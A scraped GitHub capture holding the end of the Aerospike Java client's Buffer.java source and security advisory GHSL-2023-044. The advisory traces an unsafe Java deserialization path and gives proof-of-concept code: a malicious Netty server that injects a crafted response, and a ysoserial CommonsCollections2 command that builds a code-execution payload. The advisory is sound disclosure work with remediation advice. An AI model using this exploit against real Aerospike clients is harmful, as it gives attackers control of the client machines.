 for (int i = end - 1; i >= begin; i--) { val += ((int)buf[i] - 48) \* mult; mult \*= 10; } return val; }
 public static String bytesToHexString(byte[] buf) { if (buf == null || buf.length == 0) { return ""; } StringBuilder sb = new StringBuilder(buf.length \* 2);
 for (int i = 0; i < buf.length; i++) { sb.append(String.format("%02x", buf[i])); } return sb.toString(); }
 public static String bytesToHexString(byte[] buf, int offset, int length) { StringBuilder sb = new StringBuilder(length \* 2);
 for (int i = offset; i < length; i++) { sb.append(String.format("%02x", buf[i])); } return sb.toString(); }
 public static Object bytesToObject(byte[] buf, int offset, int length) { if (length <= 0) { return null; }
 if (Value.DisableDeserializer) { throw new AerospikeException.Serialize("Object deserializer has been disabled"); }
 try (ByteArrayInputStream bastream = new ByteArrayInputStream(buf, offset, length)) { try (ObjectInputStream oistream = new ObjectInputStream(bastream)) { return oistream.readObject(); } } catch (Exception e) { throw new AerospikeException.Serialize(e); } }
 public static Value bytesToLongValue(byte[] buf, int offset, int len) { long val = 0;
 for (int i = 0; i < len; i++) { val <<= 8; val |= buf[offset+i] & 0xFF; }
 return new Value.LongValue(val); }
 public static Object bytesToGeoJSON(byte[] buf, int offset, int len) { // Ignore the flags for now int ncells = bytesToShort(buf, offset + 1); int hdrsz = 1 + 2 + (ncells \* 8); return Value.getAsGeoJSON(Buffer.utf8ToString(buf, offset + hdrsz, len - hdrsz)); }
 public static Object bytesToHLL(byte[] buf, int offset, int len) { byte[] bytes = Arrays.copyOfRange(buf, offset, offset+len); return Value.getAsHLL(bytes); }
 public static Object bytesToNumber(byte[] buf, int offset, int len) { // Server always returns 8 for integer length. if (len == 8) { return bytesToLong(buf, offset); }
 // Handle other lengths just in case server changes. if (len < 8) { // Handle variable length long. long val = 0;
 for (int i = 0; i < len; i++) { val <<= 8; val |= buf[offset+i] & 0xFF; } return val; }
 // Handle huge numbers. return bytesToBigInteger(buf, offset, len); }
 public static Object bytesToBigInteger(byte[] buf, int offset, int len) { boolean negative = false;
 if ((buf[offset] & 0x80) != 0) { negative = true; buf[offset] &= 0x7f; } byte[] bytes = new byte[len]; System.arraycopy(buf, offset, bytes, 0, len);
 BigInteger big = new BigInteger(bytes);
 if (negative) { big = big.negate(); } return big; }
 public static boolean bytesToBool(byte[] buf, int offset, int len) { if (len <= 0) { return false; } return (buf[offset] == 0)? false : true; }
 //------------------------------------------------------- // 64 bit double conversions. //-------------------------------------------------------
 public static double bytesToDouble(byte[] buf, int offset) { return Double.longBitsToDouble(bytesToLong(buf, offset)); }
 public static void doubleToBytes(double v, byte[] buf, int offset) { Buffer.longToBytes(Double.doubleToLongBits(v), buf, offset); }
 //------------------------------------------------------- // 64 bit number conversions. //-------------------------------------------------------
 /\*\* \* Convert long to big endian signed or unsigned 64 bits. \* The bit pattern will be the same regardless of sign. \*/ public static void longToBytes(long v, byte[] buf, int offset) { buf[offset++] = (byte)(v >>> 56); buf[offset++] = (byte)(v >>> 48); buf[offset++] = (byte)(v >>> 40); buf[offset++] = (byte)(v >>> 32); buf[offset++] = (byte)(v >>> 24); buf[offset++] = (byte)(v >>> 16); buf[offset++] = (byte)(v >>> 8); buf[offset] = (byte)(v >>> 0); }
 /\*\* \* Convert long to little endian signed or unsigned 64 bits. \* The bit pattern will be the same regardless of sign. \*/ public static void longToLittleBytes(long v, byte[] buf, int offset) { buf[offset++] = (byte)(v >>> 0); buf[offset++] = (byte)(v >>> 8); buf[offset++] = (byte)(v >>> 16); buf[offset++] = (byte)(v >>> 24); buf[offset++] = (byte)(v >>> 32); buf[offset++] = (byte)(v >>> 40); buf[offset++] = (byte)(v >>> 48); buf[offset] = (byte)(v >>> 56); }
 /\*\* \* Convert big endian signed 64 bits to long. \*/ public static long bytesToLong(byte[] buf, int offset) { return ( ((long)(buf[offset] & 0xFF) << 56) | ((long)(buf[offset+1] & 0xFF) << 48) | ((long)(buf[offset+2] & 0xFF) << 40) | ((long)(buf[offset+3] & 0xFF) << 32) | ((long)(buf[offset+4] & 0xFF) << 24) | ((long)(buf[offset+5] & 0xFF) << 16) | ((long)(buf[offset+6] & 0xFF) << 8) | ((long)(buf[offset+7] & 0xFF) << 0) ); }
 /\*\* \* Convert little endian signed 64 bits to long. \*/ public static long littleBytesToLong(byte[] buf, int offset) { return ( ((long)(buf[offset] & 0xFF) << 0) | ((long)(buf[offset+1] & 0xFF) << 8) | ((long)(buf[offset+2] & 0xFF) << 16) | ((long)(buf[offset+3] & 0xFF) << 24) | ((long)(buf[offset+4] & 0xFF) << 32) | ((long)(buf[offset+5] & 0xFF) << 40) | ((long)(buf[offset+6] & 0xFF) << 48) | ((long)(buf[offset+7] & 0xFF) << 56) ); }
 //------------------------------------------------------- // 32 bit number conversions. //-------------------------------------------------------
 /\*\* \* Convert int to big endian signed or unsigned 32 bits. \* The bit pattern will be the same regardless of sign. \*/ public static void intToBytes(int v, byte[] buf, int offset) { buf[offset++] = (byte)(v >>> 24); buf[offset++] = (byte)(v >>> 16); buf[offset++] = (byte)(v >>> 8); buf[offset] = (byte)(v >>> 0); }
 /\*\* \* Convert int to little endian signed or unsigned 32 bits. \* The bit pattern will be the same regardless of sign. \*/ public static void intToLittleBytes(int v, byte[] buf, int offset) { buf[offset++] = (byte)(v >>> 0); buf[offset++] = (byte)(v >>> 8); buf[offset++] = (byte)(v >>> 16); buf[offset] = (byte)(v >>> 24); }
 /\*\* \* Convert big endian signed 32 bits to int. \*/ public static int bytesToInt(byte[] buf, int offset) { return ( ((buf[offset] & 0xFF) << 24) | ((buf[offset+1] & 0xFF) << 16) | ((buf[offset+2] & 0xFF) << 8) | ((buf[offset+3] & 0xFF) << 0) ); }
 /\*\* \* Convert little endian signed 32 bits to int. \*/ public static int littleBytesToInt(byte[] buf, int offset) { return ( ((buf[offset] & 0xFF) << 0) | ((buf[offset+1] & 0xFF) << 8) | ((buf[offset+2] & 0xFF) << 16) | ((buf[offset+3] & 0xFF) << 24) ); }
 /\*\* \* Convert big endian unsigned 32 bits to long. \*/ public static long bigUnsigned32ToLong(byte[] buf, int offset) { return ( ((long)(buf[offset] & 0xFF) << 24) | ((long)(buf[offset+1] & 0xFF) << 16) | ((long)(buf[offset+2] & 0xFF) << 8) | ((long)(buf[offset+3] & 0xFF) << 0) ); }
 //------------------------------------------------------- // 16 bit number conversions. //-------------------------------------------------------
 /\*\* \* Convert int to big endian signed or unsigned 16 bits. \* The bit pattern will be the same regardless of sign. \*/ public static void shortToBytes(int v, byte[] buf, int offset) { buf[offset++] = (byte)(v >>> 8); buf[offset] = (byte)(v >>> 0); }
 /\*\* \* Convert int to little endian signed or unsigned 16 bits. \* The bit pattern will be the same regardless of sign. \*/ public static void shortToLittleBytes(int v, byte[] buf, int offset) { buf[offset++] = (byte)(v >>> 0); buf[offset] = (byte)(v >>> 8); }
 /\*\* \* Convert big endian unsigned 16 bits to int. \*/ public static int bytesToShort(byte[] buf, int offset) { return ( ((buf[offset] & 0xFF) << 8) | ((buf[offset+1] & 0xFF) << 0) ); }
 /\*\* \* Convert little endian unsigned 16 bits to int. \*/ public static int littleBytesToShort(byte[] buf, int offset) { return ( ((buf[offset] & 0xFF) << 0) | ((buf[offset+1] & 0xFF) << 8) ); }
 /\*\* \* Convert big endian signed 16 bits to short. \*/ public static short bigSigned16ToShort(byte[] buf, int offset) { return (short)( ((buf[offset] & 0xFF) << 8) | ((buf[offset+1] & 0xFF) << 0) ); }
 //------------------------------------------------------- // Variable byte number conversions. //-------------------------------------------------------
 /\*\* \* Encode an integer in variable 7-bit format. \* The high bit indicates if more bytes are used. \* Return byte size of integer. \*/ public static int intToVarBytes(int v, byte[] buf, int offset) { int i = offset;
 while (i < buf.length && v >= 0x80) { buf[i++] = (byte)(v | 0x80); v >>>= 7; }
 if (i < buf.length) { buf[i++] = (byte)v; return i - offset; } return 0; }
 /\*\* \* Decode an integer in variable 7-bit format. \* The high bit indicates if more bytes are used. \* Return value and byte size in array. \*/ public static int[] varBytesToInt(byte[] buf, int offset) { int i = offset; int val = 0; int shift = 0; byte b;
 do { b = buf[i++]; val |= (b & 0x7F) << shift; shift += 7; } while ((b & 0x80) != 0);
 return new int[] {val, i - offset}; }}

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_93c5073d_20250110_224547.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Faerospike%2Faerospike-client-java%2Fblob%2Fe40a49b3db0d2b3d45068910e1cb9d917c795315%2Fclient%2Fsrc%2Fcom%2Faerospike%2Fclient%2Fasync%2FNettyCommand.java)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Faerospike%2Faerospike-client-java%2Fblob%2Fe40a49b3db0d2b3d45068910e1cb9d917c795315%2Fclient%2Fsrc%2Fcom%2Faerospike%2Fclient%2Fasync%2FNettyCommand.java)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=aerospike%2Faerospike-client-java)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[aerospike](/aerospike)
/
**[aerospike-client-java](/aerospike/aerospike-client-java)**
Public

* [Notifications](/login?return_to=%2Faerospike%2Faerospike-client-java) You must be signed in to change notification settings
* [Fork
  215](/login?return_to=%2Faerospike%2Faerospike-client-java)
* [Star
   238](/login?return_to=%2Faerospike%2Faerospike-client-java)

* [Code](/aerospike/aerospike-client-java)
* [Issues
  10](/aerospike/aerospike-client-java/issues)
* [Pull requests
  5](/aerospike/aerospike-client-java/pulls)
* [Actions](/aerospike/aerospike-client-java/actions)
* [Projects
  0](/aerospike/aerospike-client-java/projects)
* [Security](/aerospike/aerospike-client-java/security)
* [Insights](/aerospike/aerospike-client-java/pulse)

Additional navigation options

* [Code](/aerospike/aerospike-client-java)
* [Issues](/aerospike/aerospike-client-java/issues)
* [Pull requests](/aerospike/aerospike-client-java/pulls)
* [Actions](/aerospike/aerospike-client-java/actions)
* [Projects](/aerospike/aerospike-client-java/projects)
* [Security](/aerospike/aerospike-client-java/security)
* [Insights](/aerospike/aerospike-client-java/pulse)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_6d2ad6bf_20250110_224554.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Faerospike%2Faerospike-client-java%2Fsecurity%2Fadvisories%2FGHSA-jj95-55cr-9597)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Faerospike%2Faerospike-client-java%2Fsecurity%2Fadvisories%2FGHSA-jj95-55cr-9597)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=aerospike%2Faerospike-client-java)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[aerospike](/aerospike)
/
**[aerospike-client-java](/aerospike/aerospike-client-java)**
Public

* [Notifications](/login?return_to=%2Faerospike%2Faerospike-client-java) You must be signed in to change notification settings
* [Fork
  215](/login?return_to=%2Faerospike%2Faerospike-client-java)
* [Star
   238](/login?return_to=%2Faerospike%2Faerospike-client-java)

* [Code](/aerospike/aerospike-client-java)
* [Issues
  10](/aerospike/aerospike-client-java/issues)
* [Pull requests
  5](/aerospike/aerospike-client-java/pulls)
* [Actions](/aerospike/aerospike-client-java/actions)
* [Projects
  0](/aerospike/aerospike-client-java/projects)
* [Security](/aerospike/aerospike-client-java/security)
* [Insights](/aerospike/aerospike-client-java/pulse)

Additional navigation options

* [Code](/aerospike/aerospike-client-java)
* [Issues](/aerospike/aerospike-client-java/issues)
* [Pull requests](/aerospike/aerospike-client-java/pulls)
* [Actions](/aerospike/aerospike-client-java/actions)
* [Projects](/aerospike/aerospike-client-java/projects)
* [Security](/aerospike/aerospike-client-java/security)
* [Insights](/aerospike/aerospike-client-java/pulse)

# Unsafe deserialization of server responses

Critical

[BrianNichols](/BrianNichols)
published
GHSA-jj95-55cr-9597
Aug 3, 2023

## Package

maven

com.aerospike:aerospike-client
([Maven](/advisories?query=ecosystem%3Amaven))

## Affected versions

<4.5.0, 5.0.0, 5.0.1, 5.0.2, 5.0.3, 5.0.4, 5.0.5, 5.0.6, 5.0.7, 5.1.0, 5.1.1, 5.1.2, 5.1.3, 5.1.4, 5.1.5, 5.1.6, 5.1.7, 5.1.8, 5.1.9, 5.1.10, 5.1.11, 6.0.0, 6.0.1, 6.1.1, 6.1.2, 6.1.3, 6.1.4, 6.1.5, 6.1.6, 6.1.7, 6.1.8, 6.1.9, 6.1.10, 6.1.11

## Patched versions

6.2.0, 5.2.0, 4.5.0

## Description

# GitHub Security Lab (GHSL) Vulnerability Report: `GHSL-2023-044`

The [GitHub Security Lab](https://securitylab.github.com) team has identified a potential security vulnerability in [Aerospike Java Client](https://github.com/aerospike/aerospike-client-java/).

We are committed to working with you to help resolve this issue. In this report you will find everything you need to effectively coordinate a resolution of this issue with the GHSL team.

If at any point you have concerns or questions about this process, please do not hesitate to reach out to us at `securitylab@github.com` (please include `GHSL-2023-044` as a reference).

If you are *NOT* the correct point of contact for this report, please let us know!

## Summary

The Aerospike Java client is a Java application that implements a network protocol to communicate with an Aerospike server. Some of the messages received from the server contain Java objects that the client deserializes when it encounters them without further validation. Attackers that manage to trick clients into communicating with a malicious server can include especially crafted objects in its responses that, once deserialized by the client, force it to execute arbitrary code. This can be abused to take control of the machine the client is running on.

## Product

Aerospike Java Client

## Tested Version

[6.1.7](https://github.com/aerospike/aerospike-client-java/releases/tag/6.1.7)

## Details

### Issue: Unsafe deserialization of server responses (`GHSL-2023-044`)

The Aerospike Java client implements different ways of communicating with an Aerospike server to perform several operations. Asynchronous commands can be executed using the Netty framework using the `NettyCommand` class. This class includes an `InboundHandler` that extends Netty's `ChannelInboundHandlerAdapter`, which handles inbound data coming from the Netty channel established with the server. This is implemented in the `channelRead` method:

[`client/src/com/aerospike/client/async/NettyCommand.java:1157`](https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L1157)

```
@Override
public void channelRead(ChannelHandlerContext ctx, Object msg) {
    command.read((ByteBuf)msg);
}
```

The incoming `msg` object is handled by the `NettyCommand.read` method, which behaves differently depending on the `state` variable. Several states produce paths to the vulnerable code — for instance, we will follow the path through `AsyncCommand.COMMAND_READ_HEADER`:

[`/client/src/com/aerospike/client/async/NettyCommand.java:489`](https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L489)

```
private void read(ByteBuf byteBuffer) {
    eventReceived = true;

    try {
        switch (state) {
            // --snip--
            case AsyncCommand.COMMAND_READ_HEADER:
                if (command.isSingle) {
                    readSingleHeader(byteBuffer);
                }
                // --snip--
        }
        // --snip--
    }
    // --snip---
}
```

Some bytes are read from the message buffer and saved in `command.dataBuffer` in the `readSingleHeader` method, after which `parseSingleBody` is called:

[`client/src/com/aerospike/client/async/NettyCommand.java:596`](https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L596)

```
private void readSingleHeader(ByteBuf byteBuffer) {
    int readableBytes = byteBuffer.readableBytes();
    int dataSize = command.dataOffset + readableBytes;

    // --snip--

    byteBuffer.readBytes(command.dataBuffer, 0, dataSize);
    command.dataOffset = dataSize;

    if (command.dataOffset >= receiveSize) {
        parseSingleBody();
    }
}
```

`parseSingleBody` simply delegates on `AsyncCommand.parseCommandResult`, which unless the message is compressed, directly calls `AsyncCommand.parseResult`. The implementation of this method depends on the command type. For an `AsyncRead` command, we have the following:

[`client/src/com/aerospike/client/async/AsyncRead.java:68`](https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/AsyncRead.java#L68)

```
@Override
protected final boolean parseResult() {
    validateHeaderSize();

    int resultCode = dataBuffer[dataOffset + 5] & 0xFF;
    int generation = Buffer.bytesToInt(dataBuffer, dataOffset + 6);
    int expiration = Buffer.bytesToInt(dataBuffer, dataOffset + 10);
    int fieldCount = Buffer.bytesToShort(dataBuffer, dataOffset + 18);
    int opCount = Buffer.bytesToShort(dataBuffer, dataOffset + 20);
    dataOffset += Command.MSG_REMAINING_HEADER_SIZE;

    if (resultCode == 0) {
        // --snip--
        skipKey(fieldCount);
        record = parseRecord(opCount, generation, expiration, isOperation);
        return true;
    }
```

It can be seen that several fields are read from the message's bytes, and then a call to `Command.parseRecord` happens:

[`client/src/com/aerospike/client/command/Command.java:2083`](https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Command.java#L2083)

```
protected final Record parseRecord(
    int opCount,
    int generation,
    int expiration,
    boolean isOperation
)  {
    Map<String,Object> bins = new LinkedHashMap<>();

    for (int i = 0 ; i < opCount; i++) {
        int opSize = Buffer.bytesToInt(dataBuffer, dataOffset);
        byte particleType = dataBuffer[dataOffset + 5];
        byte nameSize = dataBuffer[dataOffset + 7];
        String name = Buffer.utf8ToString(dataBuffer, dataOffset + 8, nameSize);
        dataOffset += 4 + 4 + nameSize;

        int particleBytesSize = opSize - (4 + nameSize);
        Object value = Buffer.bytesToParticle(particleType, dataBuffer, dataOffset, particleBytesSize);
```

`Buffer.bytesToParticle` converts the remaining bytes in the data buffer depending on the `particleType` field. We're interested in the `JBLOB` case:

[`client/src/com/aerospike/client/command/Buffer.java:53`](https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L53)

```
public static Object bytesToParticle(int type, byte[] buf, int offset, int len)
    throws AerospikeException {
        switch (type) {
            // --snip--
            case ParticleType.JBLOB:
                return Buffer.bytesToObject(buf, offset, len);
```

In `bytesToObject`, the deserialization of an object from the message bytes happens:

[`client/src/com/aerospike/client/command/Buffer.java:300`](https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L300)

```
public static Object bytesToObject(byte[] buf, int offset, int length) {
    // --snip--
    try (ByteArrayInputStream bastream = new ByteArrayInputStream(buf, offset, length)) {
        try (ObjectInputStream oistream = new ObjectInputStream(bastream)) {
            return oistream.readObject();
        }
    }
    // --snip--
}
```

NOTE: Take into account that there exists a similar sink, that can be reached in a similar way, in `Unpacker.unpackBlock`:

[`client/src/com/aerospike/client/util/Unpacker.java:227`](https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/util/Unpacker.java#L227)

```
private T unpackBlob(int count) throws IOException, ClassNotFoundException {
    // --snip--
    case ParticleType.JBLOB:
        // --snip--
        try (ByteArrayInputStream bastream = new ByteArrayInputStream(buffer, offset, count)) {
            try (ObjectInputStream oistream = new ObjectInputStream(bastream)) {
                val = getJavaBlob(oistream.readObject());
            }
        }
```

This vulnerability was discovered with the help of [CodeQL](https://codeql.github.com/).

#### Impact

This issue may lead to Remote Code Execution (RCE) in the Java client.

#### Remediation

Avoid deserialization of untrusted data if at all possible. If the architecture permits it then use other formats instead of serialized objects, for example JSON or XML. However, these formats should not be deserialized into complex objects because this provides further opportunities for attack. For example, XML-based deserialization attacks are possible through libraries such as XStream and XmlDecoder.

Alternatively, a tightly controlled whitelist can limit the vulnerability of code but be aware of the existence of so-called Bypass Gadgets, which can circumvent such protection measures.

#### Resources

To exploit this vulnerability, a malicious Aerospike server is needed. For the sake of simplicity, we implemented a mock server with hardcoded responses, with the only goal of reaching the vulnerable code of the client. To be able to easily reproduce this, we used the client's examples with the `-netty` flag, specifically the `AsyncPutGet`, which uses an `AsyncRead`. The examples point to `localhost:3000` by default, so we set up a simple Netty TCP server listening on that port, which replicates responses previously intercepted from a real Aerospike server and returns them to the client, until the `AsyncRead` command happens. Then, our server injects the malicious response:

```
public class AttackChannelHandler extends SimpleChannelInboundHandler<String> {

    @Override
    protected void channelRead0(ChannelHandlerContext ctx, String s) throws Exception {
        // --snip--
        if (s.getBytes()[7] == 0x44) {
            AttackMessage m = new AttackMessage(
                    Files.readAllBytes(Paths.get("location/of/deserialization/payload.bin")));
            ctx.channel().writeAndFlush(m);
            return;
        }
        // --snip--
    }
}
```

`AttackMessage` is a class that hardcodes the necessary data to deliver the payload:

```
public class AttackMessage {

    private byte resultCode = 0;
    private int generation = 2;
    private int expiration = 417523457;
    private short fieldCount = 0;
    private short opCount = 1;
    private byte particleType = 7;
    private String name = "putgetbin";
    private byte[] payload;

    public AttackMessage(byte[] payload) {
        this.payload = payload;
    }

    // --snip-- (getters)

    public int[] getSize() {
        int size = 30 + name.length() + payload.length;
        int low = (byte) (size & 0xFF);
        int high = (byte) (size >> 8) & 0xFF;
        return new int[] {high, low};
    }

    public int getOpSize() {
        return payload.length + 4 + name.length();
    }

    public byte[] getPayload() {
        return payload;
    }
}
```

And it's finally encoded and delivered to the client through the network using a `MessageToByteEncoder` from Netty:

```
public class AttackMessageEncoder extends MessageToByteEncoder<AttackMessage> {

    @Override
    protected void encode(ChannelHandlerContext ctx, AttackMessage msg, ByteBuf out)
            throws Exception {
        // header
        out.writeBytes(new byte[] {0x02, 0x03, 0x00, 0x00, 0x00, 0x00});
        int[] length = msg.getSize();
        out.writeByte(length[0]);
        out.writeByte(length[1]);

        out.writeBytes(new byte[] {0x16, 0x00, 0x00, 0x00, 0x00});
        out.writeByte(msg.getResultCode());
        out.writeInt(msg.getGeneration());
        out.writeInt(msg.getExpiration());

        out.writeBytes(new byte[] {0x00, 0x00, 0x00, 0x00});
        out.writeShort(msg.getFieldCount());
        out.writeShort(msg.getOpCount());
        out.writeInt(msg.getOpSize());

        out.writeByte(0x01);
        out.writeByte(msg.getParticleType());

        out.writeByte(0x00);
        out.writeByte(msg.getName().length());
        out.writeCharSequence(msg.getName(), Charset.defaultCharset());
        out.writeBytes(msg.getPayload());
    }

}
```

The specific deserialization payload that needs to be used depends on the deserialization gadgets available in the classpath of the application using the Aerospike client. Again, for simplicity, we assumed the victim application uses Apache Commons Collections 4.0, which contains a well-known deserialization gadget:

```
<dependency>
  <groupId>org.apache.commons</groupId>
  <artifactId>commons-collections4</artifactId>
  <version>4.0</version>
</dependency>
```

In which case, the malicious payload file could be generated using [`ysoserial`](https://github.com/frohoff/ysoserial) as follows:

```
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2 '/System/Applications/Calculator.app/Contents/MacOS/Calculator' > payload.bin

```
## GitHub Security Advisories

We recommend you create a private [GitHub Security Advisory](https://help.github.com/en/github/managing-security-vulnerabilities/creating-a-security-advisory) for this finding. This also allows you to invite the GHSL team to collaborate and further discuss this finding in private before it is [published](https://help.github.com/en/github/managing-security-vulnerabilities/publishing-a-security-advisory).

## Credit

This issue was discovered and reported by the GitHub CodeQL team members [@atorralba (Tony Torralba)](https://github.com/atorralba) and [@joefarebrother (Joseph Farebrother)](https://github.com/joefarebrother).

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2023-044` in any communication regarding this issue.

## Disclosure Policy

